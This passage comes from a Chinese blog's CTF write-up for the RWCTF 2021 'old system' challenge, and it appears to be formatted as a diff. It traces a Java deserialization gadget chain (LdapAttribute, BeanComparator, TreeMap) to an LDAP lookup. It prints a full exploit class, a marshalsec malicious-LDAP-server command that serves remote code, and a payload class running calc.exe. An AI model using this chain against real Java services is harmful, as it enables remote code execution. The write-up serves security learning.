<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span>);<br>        <span class="hljs-keyword">this</span>.baseCtxEnv.put(<span class="hljs-string">&quot;java.naming.provider.url&quot;</span>, <span class="hljs-keyword">this</span>.baseCtxURL);<br>        <span class="hljs-keyword">this</span>.baseCtx = <span class="hljs-keyword">new</span> InitialDirContext(<span class="hljs-keyword">this</span>.baseCtxEnv);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.baseCtx;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>这时只要能调用<code>lookup</code>，就能触发<code>ldap</code>的反序列化攻击</p>
+<p>看到<code>lookup</code>的调用栈</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.naming</span>.InitialContext<span class="hljs-selector-id">#lookup</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.url</span><span class="hljs-selector-class">.ldap</span>.ldapURLContext<span class="hljs-selector-id">#lookup</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.url</span>.GenericURLContext<span class="hljs-selector-id">#lookup</span>(java<span class="hljs-selector-class">.lang</span>.String)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.PartialCompositeContext<span class="hljs-selector-id">#lookup</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.ComponentContext#p_lookup<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.ldap</span>.LdapCtx#c_lookup<br></code></pre></td></tr></table></figure>
+
+
+<p>发现只要能调用<code>com.sun.jndi.ldap.LdapCtx#c_lookup</code>，就能触发，而在刚才的<code>getSchema</code>方法中，最终就能调用<code>com.sun.jndi.ldap.LdapCtx#c_lookup</code>,因此最终的半条链也完成了</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.ldap</span>.LdapAttribute#getAttributeDefinition<br>-&gt; javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.directory</span>.InitialDirContext<span class="hljs-selector-id">#getSchema</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.PartialCompositeDirContext<span class="hljs-selector-id">#getSchema</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.ComponentDirContext#p_getSchema<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.ComponentContext#p_resolveIntermediate<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.AtomicContext#c_resolveIntermediate_nns<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.toolkit</span><span class="hljs-selector-class">.ctx</span>.ComponentContext#c_resolveIntermediate_nns<br>-&gt; com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.ldap</span>.LdapCtx#c_lookup<br></code></pre></td></tr></table></figure>
+
+
+
+
+<p>最后的exp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test2</span> </span>&#123;<br><br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException, IOException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvalidNameException </span>&#123;<br>		String ldapCtxUrl = <span class="hljs-string">&quot;ldap://127.0.0.1:1389&quot;</span>;<br>        Class ldapAttributeClazz = Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(<br><span class="hljs-keyword">new</span> Class[] &#123;String.class&#125;);<br>        ldapAttributeClazzConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(<br><span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;name&quot;</span>&#125;);<br>        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(<span class="hljs-string">&quot;baseCtxURL&quot;</span>);<br>        baseCtxUrlField.setAccessible(<span class="hljs-keyword">true</span>);<br>        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);<br>        Field rdnField = ldapAttributeClazz.getDeclaredField(<span class="hljs-string">&quot;rdn&quot;</span>);<br>        rdnField.setAccessible(<span class="hljs-keyword">true</span>);<br>        rdnField.set(ldapAttribute, <span class="hljs-keyword">new</span> CompositeName(<span class="hljs-string">&quot;a//b&quot;</span>));<br>        <br>	BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;class&quot;</span>);<br>	TreeMap tree1 = <span class="hljs-keyword">new</span> TreeMap(comparator);<br>	tree1.put(ldapAttribute, <span class="hljs-keyword">null</span>);<br>	TreeMap tree2 = <span class="hljs-keyword">new</span> TreeMap(comparator);<br>	tree2.put(ldapAttribute, <span class="hljs-keyword">null</span>);<br>	Hashtable hm = <span class="hljs-keyword">new</span> Hashtable();<br>	hm.put(tree1, <span class="hljs-string">&quot;aaa&quot;</span>);<br>	hm.put(tree2, <span class="hljs-string">&quot;bbb&quot;</span>);<br>    Field propertyField = BeanComparator.class.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>    propertyField.setAccessible(<span class="hljs-keyword">true</span>);<br>    propertyField.set(comparator, <span class="hljs-string">&quot;attributeDefinition&quot;</span>);<br>	FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;output/treemap.bin&quot;</span>);<br>	ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>	oos.writeObject(hm);<br>	FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;output/treemap.bin&quot;</span>);<br>	ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>	Hashtable tr = (Hashtable)ois.readObject();<br>	System.out.println(tr);<br><br>	&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>起一个恶意的ldap服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar  marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://127.0.0.1:8081/#exp&quot;</span> <span class="hljs-number">1389</span><br></code></pre></td></tr></table></figure>
+<p>然后在相应的web服务上放一个编译后的exp.class(不能带有package,要用jdk1.4编译)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>&#123;<br><br>	<span class="hljs-keyword">static</span> &#123;<br>		<span class="hljs-keyword">try</span> &#123;<br>			Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>		&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>			<span class="hljs-comment">// TODO Auto-generated catch block</span><br>			e.printStackTrace();<br>		&#125;<br>	&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+<p>成功弹出计算器</p>
+<p><img src="https://i.loli.net/2021/02/15/meNOcUg35XrSsfP.png" srcset="/img/loading.gif"></p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/voidfyoo/rwctf-2021-old-system/tree/main/writeup">https://github.com/voidfyoo/rwctf-2021-old-system/tree/main/writeup</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/java%E9%A2%98%E7%9B%AE/">java题目</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-Final/">
+                        <span class="hidden-mobile">JAVA反序列化题目-网鼎杯 2020 Final</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
